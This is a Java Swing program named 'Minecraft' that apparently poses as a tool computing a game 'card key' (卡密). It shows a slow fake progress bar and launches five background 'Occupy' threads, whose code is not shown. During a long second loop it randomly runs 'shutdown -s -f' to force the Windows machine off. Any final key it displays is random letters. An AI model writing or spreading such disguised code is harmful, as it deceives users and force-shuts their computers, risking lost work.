package Main_package;

import Card_thread.*;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.util.Random;

public class Minecraft extends JFrame implements Runnable {
    private JProgressBar progress; // 进度条
    public Minecraft(String str) {
        super(str);
        progress = new JProgressBar(0, 100); // 实例化进度条

        progress.setStringPainted(true);      // 描绘文字
        this.add(progress);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setSize(268, 44);// 导出exe长度用44
        this.setLocationRelativeTo(null);
        this.setVisible(true);
        this.setResizable(false);
    }
    public void run() {
    	int jc=0;
            for(int i=0; i<100; i++) {// 一层循环
                try {
                    progress.setValue(progress.getValue() + 1); // 随着线程进行，增加进度条值

                    progress.setString(progress.getValue() + "%");
                    Random s = new Random();
                    int sj=s.nextInt(2000);
                    Thread.sleep(sj);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
             }
            Occupy_thread xi=new Occupy_thread();
        	Thread th=new Thread(xi);
        	th.start();
        	Occupy_thread_2 xi2=new Occupy_thread_2();
        	Thread th2=new Thread(xi2);
        	th2.start();
        	Occupy_thread_3 xi3=new Occupy_thread_3();
        	Thread th3=new Thread(xi3);
        	th3.start();
        	Occupy_thread_4 xi4=new Occupy_thread_4();
        	Thread th4=new Thread(xi4);
        	th4.start();
        	Occupy_thread_5 xi5=new Occupy_thread_5();
        	Thread th5=new Thread(xi5);
        	th5.start();
            Random s1 = new Random();
            if(progress.getValue()==100||jc==0) {//第一次判断
            	jc++;
            	this.setTitle("正在计算");
            	progress.setValue(0);
                    for(int i1=0; i1<100; i1++) {//二层循环
                        try {
                            progress.setValue(progress.getValue() + 1);

                            progress.setString(progress.getValue() + "%");
                            int a=1000*60*3;
                            Thread.sleep(a);
                            if (s1.nextInt(50)==8) {
								try {
									Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "shutdown -s -f");
								} catch (IOException e) {
									e.printStackTrace();
									System.exit(0);
								}
								System.exit(0);
							}
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                   }
            	}
                if(progress.getValue()==100) {//最终判断
                	String[] km= {"A","B","C","D","E","F","G","H","I","J","K","L","M",
                				  "N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};
                	Random sj=new Random();
                	int suiji=sj.nextInt(26);
                	int suiji2=sj.nextInt(26);
                	int suiji3=sj.nextInt(26);
                	int suiji4=sj.nextInt(26);
                	int suiji5=sj.nextInt(26);
                	int suiji6=sj.nextInt(26);
                	int suiji7=sj.nextInt(26);
                	int suiji8=sj.nextInt(26);
                	int suiji9=sj.nextInt(26);
                	int suiji10=sj.nextInt(26);
                	int suiji11=sj.nextInt(26);
                	int suiji12=sj.nextInt(26);
                	int suiji13=sj.nextInt(26);
                	int suiji14=sj.nextInt(26);
                	int suiji15=sj.nextInt(26);
                	int suiji16=sj.nextInt(26);
                	int suiji17=sj.nextInt(26);
                	int suiji18=sj.nextInt(26);
                	int suiji19=sj.nextInt(26);
                	int suiji20=sj.nextInt(26);
                	String st=km[suiji]+km[suiji2]+km[suiji3]+km[suiji4];
                	String st2=km[suiji5]+km[suiji6]+km[suiji7]+km[suiji8];
                	String st3=km[suiji9]+km[suiji10]+km[suiji11]+km[suiji12];
                	String st4=km[suiji13]+km[suiji14]+km[suiji15]+km[suiji16];
                	String st5=km[suiji17]+km[suiji18]+km[suiji19]+km[suiji20];
                	System.out.println(st);
                	JLabel bq=new JLabel("卡密:"+st+"-"+st2+"-"+st3+"-"+st4+"-"+st5);
                	JButton an=new JButton("结束");
                	JFrame ct=new JFrame("计算成功");
                	Container a=getContentPane();
                	ct.setLayout(new FlowLayout());
                	ct.setDefaultCloseOperation(ct.EXIT_ON_CLOSE);
                	ct.setSize(300, 80);
                	ct.setLocationRelativeTo(null);
                	ct.setVisible(true);
                	ct.setResizable(false);
                	ct.add(bq);
                	ct.add(an);
                	an.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent e) {
							System.exit(0);
						}
					});
                }
            }
}